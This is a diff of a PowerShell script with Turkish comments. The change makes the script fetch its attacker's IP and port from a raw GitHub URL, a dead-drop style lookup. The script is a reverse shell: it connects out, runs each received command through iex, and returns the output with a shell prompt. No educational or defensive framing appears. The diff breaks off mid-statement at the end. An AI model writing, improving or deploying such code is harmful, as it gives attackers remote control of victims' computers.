@@ -1,8 +1,13 @@
 # Bağlantı linkini belirle
-$link = https://raw.githubusercontent.com/jmfjlkelmf/oerb/main/rotg
+$url = "https://raw.githubusercontent.com/jmfjlkelmf/oerb/main/rotg"
 
-# IP adresi ve portu ayır
-$parts = $link -split ':'
+# Web içeriğini al
+$response = Invoke-WebRequest -Uri $url
+
+# İçerikten IP ve portu ayır
+# Örneğin, içerik "192.168.1.2:55" gibi bir string döndürüyor olsun.
+$content = $response.Content.Trim()
+$parts = $content -split ':'
 $server = $parts[0]
 $port = [int]$parts[1]
 
@@ -21,8 +26,4 @@ while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
     $sendback = (iex ". { $data } 2>&1" | Out-String)
     $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
     $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2)
-    $stream.Write($sendbyte, 0, $sendbyte.Length)
-    $stream.Flush()
-}
-
-$client.Close()
+    $stream.Write($sendbyte, 
